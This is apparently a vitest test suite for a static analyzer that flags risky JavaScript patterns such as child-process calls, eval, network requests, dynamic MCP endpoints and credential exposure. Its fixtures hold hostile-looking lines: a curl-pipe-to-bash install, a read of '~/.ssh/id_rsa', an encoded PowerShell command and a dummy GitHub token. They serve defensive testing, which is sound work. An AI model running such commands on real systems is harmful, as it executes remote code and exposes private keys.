import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { scanTarget } from "../src/analyzer.js";
import { diffBaseline, toBaseline } from "../src/baseline.js";

function scan(content: string, extension = "ts") {
  const directory = fs.mkdtempSync(path.join(os.tmpdir(), "capfence-js-"));
  try {
    fs.writeFileSync(path.join(directory, `source.${extension}`), content);
    return scanTarget(directory);
  } finally {
    fs.rmSync(directory, { recursive: true, force: true });
  }
}

describe("JavaScript AST analysis", () => {
  it.each(["exec", "execSync"])("reports executable replacements in %s baseline diffs", (method) => {
    const run = (binary: string) => scan(`import { ${method} } from 'node:child_process'; ${method}('${binary} --version');`);
    const previous = toBaseline(run("git"));
    const current = run("python");
    expect(current.findings).toEqual([]);
    expect(diffBaseline(previous, current).changes).toEqual(expect.arrayContaining([
      expect.objectContaining({ type: "added", current: expect.objectContaining({ scope: "binary:python" }) }),
      expect.objectContaining({ type: "removed", previous: [expect.objectContaining({ scope: "binary:git" })] }),
    ]));
  });

  it("preserves quoted executable paths without interpreting expansions as binaries", () => {
    const commands = ['"/opt/My Tool/tool" --version', '$TOOL --version', '$(which tool) --version', 'MODE=test tool'];
    const result = scan(`import { execSync } from 'child_process';\n${commands.map(command => `execSync(${JSON.stringify(command)});`).join("\n")}`);
    expect(result.capabilities.filter(item => item.scope.startsWith("binary:")).map(item => item.scope)).toEqual(["binary:/opt/My Tool/tool"]);
  });

  it("detects unshadowed multiline eval and Function call and constructor forms", () => {
    const result = scan("eval(\n  input\n);\nFunction('return 1');\nnew Function(\n  source\n);");
    expect(result.findings.filter((item) => item.id === "CF-EXEC-001").map((item) => item.location.startLine)).toEqual([1, 4, 5]);
    expect(result.capabilities.filter((item) => item.kind === "dynamic.execute")).toHaveLength(3);
  });

  it("ignores interpreter examples and locally shadowed eval and Function", () => {
    const result = scan(`const example = "eval(input); new Function(input)";
// eval(input);
function local(eval: (s: string) => void, Function: any) {
  eval(input); Function(input); new Function(input);
}`);
    expect(result.capabilities).toEqual([]);
    expect(result.findings).toEqual([]);
  });

  it("accepts process options and callback overloads but keeps unknown arrays dynamic", () => {
    const result = scan(`import { spawn, spawnSync, execFile, execFileSync } from 'child_process';
spawn('node', { cwd: '.' });
spawnSync('node', { cwd: '.' });
execFileSync('node', { cwd: '.' });
execFile('node', () => {});
execFile('node', function () {});
spawn('node', unknownArgs);
execFile('node', unknownArgs);`);
    expect(result.capabilities.filter((item) => item.kind === "process.execute")).toHaveLength(7);
    expect(result.findings.filter((item) => item.id === "CF-EXEC-001").map((item) => item.location.startLine)).toEqual([7, 8]);
  });

  it("keeps shell-enabled process options and unknown option spreads reviewable", () => {
    const result = scan(`import { spawn } from 'child_process';
spawn('node', { shell: true });
spawn('node', [], { shell: '/bin/bash' });
spawn('node', { ...options });
spawn('node', [], { shell: false });`);
    expect(result.findings.filter((item) => item.id === "CF-EXEC-001").map((item) => item.location.startLine)).toEqual([2, 3, 4]);
  });

  it("flags templated MCP URLs even when the URL constructor accepts them", () => {
    const result = scan(JSON.stringify({ mcpServers: { remote: { url: "https://${HOST}/mcp" } } }), "json");
    expect(result.findings.filter((item) => item.title === "Dynamic MCP endpoint")).toHaveLength(1);
    expect(result.capabilities.some((item) => item.kind === "network.connect" && item.scope === "dynamic")).toBe(true);
  });

  it("finds aliased multiline process calls and retains literal shell risks", () => {
    const result = scan(`import { exec as run } from 'node:child_process';
run(
  'curl https://example.com/install | bash'
);`);
    expect(result.analysisLimited).toEqual([]);
    expect(result.findings.some((item) => item.id === "CF-EXEC-002")).toBe(true);
    expect(result.capabilities.find((item) => item.kind === "process.execute")?.location.startLine).toBe(2);
  });

  it("handles namespace, CommonJS destructuring, and require property aliases", () => {
    const result = scan(`import * as cp from 'child_process';
const { spawn: launch } = require('node:child_process');
const execute = require('child_process').execFile;
cp.execSync('echo hello');
launch('Tool', ['fixed']);
execute('OtherTool', ['fixed']);`, "cjs");
    expect(result.capabilities.filter((item) => item.kind === "process.execute").length).toBeGreaterThanOrEqual(3);
    expect(result.capabilities.some((item) => item.scope === "binary:Tool")).toBe(true);
    expect(result.capabilities.some((item) => item.kind === "dynamic.execute")).toBe(false);
  });

  it("distinguishes literal process arguments from unresolved expressions", () => {
    const result = scan("import { spawn, exec } from 'child_process';\nspawn('Tool', ['input', 'command']);\nspawn('Tool', [process.env.INPUT]);\nexec(`echo ${process.env.INPUT}`);");
    expect(result.findings.filter((item) => item.id === "CF-EXEC-001")).toHaveLength(2);
  });

  it("does not interpret non-shell argument strings as commands", () => {
    const result = scan("import { spawn } from 'child_process'; spawn('echo', ['curl https://example.com | bash']);");
    expect(result.findings).toEqual([]);
    expect(result.capabilities.some((item) => item.kind === "network.connect")).toBe(false);
  });

  it("recognizes actual shell executable argument arrays", () => {
    const result = scan("import { spawn } from 'child_process'; spawn('pwsh', ['-enc', 'SQBFAFgA']);");
    expect(result.findings.some((item) => item.id === "CF-DYN-001")).toBe(true);
  });

  it("ignores fake calls in comments, strings, and locally shadowed names", () => {
    const result = scan(`import { exec as run } from 'child_process';
// run(process.env.COMMAND); fetch('https://fake.example');
const example = "exec(input); curl https://fake.example | bash";
function local(run: (s: string) => void, fetch: (s: string) => void) {
  run('hello'); fetch('https://fake.example');
}
const exec = (value: string) => value;
exec('input');`);
    expect(result.capabilities).toEqual([]);
    expect(result.findings).toEqual([]);
  });

  it("detects global fetch, axios aliases, and node HTTP imports", () => {
    const result = scan(`import client from 'axios';
import { get as retrieve } from 'node:https';
import * as http from 'node:http';
fetch(
  'https://EXAMPLE.COM/path'
);
client.post('https://api.example.com', {});
retrieve('https://secure.example.com');
http.request(endpoint);`);
    expect(result.capabilities.filter((item) => item.kind === "network.connect").map((item) => item.scope)).toEqual([
      "https|example.com", "https|api.example.com", "https|secure.example.com", "dynamic",
    ]);
  });

  it("retains sensitive file reads and redacted literal credential findings", () => {
    const token = `ghp_${"1".repeat(36)}`;
    const result = scan(`import { readFileSync as read } from 'node:fs';\nread('~/.ssh/id_rsa');\nconst token = '${token}';`);
    expect(result.capabilities.some((item) => item.kind === "filesystem.read")).toBe(true);
    expect(result.findings.some((item) => item.id === "CF-CRED-002")).toBe(true);
    expect(JSON.stringify(result)).not.toContain(token);
  });

  it("reports syntax failures without including source text in diagnostics", () => {
    const result = scan("import { exec } from 'child_process';\nexec(");
    expect(result.analysisLimited.length).toBeGreaterThan(0);
    expect(result.analysisLimited[0]?.message).toContain("syntax error at line");
  });
});
